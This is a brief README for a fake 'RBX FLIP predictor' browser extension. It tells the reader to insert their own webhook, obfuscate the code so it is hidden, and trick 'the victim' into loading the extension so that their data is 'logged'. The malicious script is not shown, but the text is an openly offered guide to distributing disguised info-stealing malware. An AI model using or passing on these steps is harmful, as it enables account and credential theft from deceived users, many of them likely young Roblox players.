# Fake RBX FLIP Predicter
 got this idea fron https://github.com/i3eal1/RBX-FLIP-PREDICTER, it is a pretty well made fake rbxflip predictor which was fake, so i decided to release this as a deobfuscated version.

showcase: https://www.youtube.com/watch?v=MmMmaIo50Hc

go in perdict.js and change the webhook to yours after go to https://obfuscator.io and obfuscate the new code. after replace predirect.js with the code you got.
then make the victim go to https://chrome://extensions, upload the file, and they will be logged.
